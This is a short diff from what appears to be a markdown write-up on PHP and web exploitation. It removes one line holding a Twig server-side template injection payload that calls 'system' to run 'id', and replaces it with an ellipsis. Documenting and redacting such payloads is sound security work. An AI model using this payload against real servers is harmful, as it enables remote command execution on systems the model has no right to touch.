@@ -222,4 +222,4 @@ file_put_contents ( string $filename  , mixed $data [, int $flags = 0 [, resourc
 
 ![img](source/img16.png)
 
-> Payload : {{ [0,0]|reduce("system", "id")
+> Payload : ...
